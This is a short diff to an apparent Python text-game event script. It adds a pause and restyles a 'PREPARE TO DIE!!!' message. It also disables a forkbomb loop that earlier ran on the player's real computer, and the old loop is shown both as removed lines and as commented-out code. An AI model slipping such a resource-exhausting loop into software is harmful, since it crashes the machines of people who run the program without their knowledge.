@@ -1,4 +1,6 @@
 import termcolor
+import time
+#import os
 
 if 'event5!' in kwargs['game'].events_run:
     kwargs['game'].events_run.remove('event5!')
@@ -9,12 +11,16 @@ print(termcolor.colored(
     'red'
 ))
 
+time.sleep(1.5)
+
 print(termcolor.colored(
     "PREPARE TO DIE!!!",
-    attrs=['bold', 'blink']
+    'red',
+    attrs=['bold']
 ))
 
 # Forkbomb!
-import os
-while True:
-    os.fork()
+# TODO: maybe we shouldn't *actually* forkbomb the player's IRL computer
+#       it gets kind of annoying to playtest this part
+#while True:
+#    os.fork()
